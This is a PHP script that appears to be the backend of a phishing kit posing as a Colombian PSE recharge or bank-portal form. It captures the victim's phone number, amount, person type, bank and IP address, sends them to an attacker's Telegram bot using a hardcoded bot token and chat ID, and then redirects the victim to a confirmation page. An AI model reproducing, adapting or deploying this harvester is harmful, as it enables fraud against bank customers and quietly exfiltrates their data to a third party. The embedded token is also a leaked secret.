<?php
function getUserIP() {
    // Verificar si la IP se pasa desde una cabecera HTTP_X_FORWARDED_FOR (usualmente por un proxy o un balanceador de carga)
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // Verificar si la IP se pasa desde una cabecera HTTP_CLIENT_IP (también puede ser por un proxy)
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } else {
        // Utilizar la dirección IP remota del servidor
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    // En caso de que haya múltiples IPs (como en HTTP_X_FORWARDED_FOR), tomar la primera
    $ipArray = explode(',', $ip);
    return trim($ipArray[0]);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = $_POST['Inputphone'];
    $amount = $_POST['Inputcuanto'];
    $persona = $_POST['Inputpersona'];
    $banco = $_POST['Inputbanc'];
    $userIP = getUserIP(); // Utilizar la función getUserIP para obtener la IP del usuario

    $telegramToken = '7098485787:AAF19obMvO7UxDxI_708DquFh1MCh2jGL8Q';
    $chatId = '5352335307';
    $message = "RecargaPSE A: \n\n Banco $banco\n\nTeléfono: $phone\nCantidad: $amount\nTipo de persona: $persona\n\n Usuario ingresando al portal de $banco\n\n IP del usuario: $userIP\n";

    $ch = curl_init();
    $telegramApiUrl = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response === false) {
        echo "Error al enviar el mensaje a Telegram";
        exit();
    }

    header("Location: confirmacion.php?phone=$phone&amount=$amount&persona=$persona&banco=$banco");
    exit();
} else {
    header("Location: index.html");
    exit();
}
?>
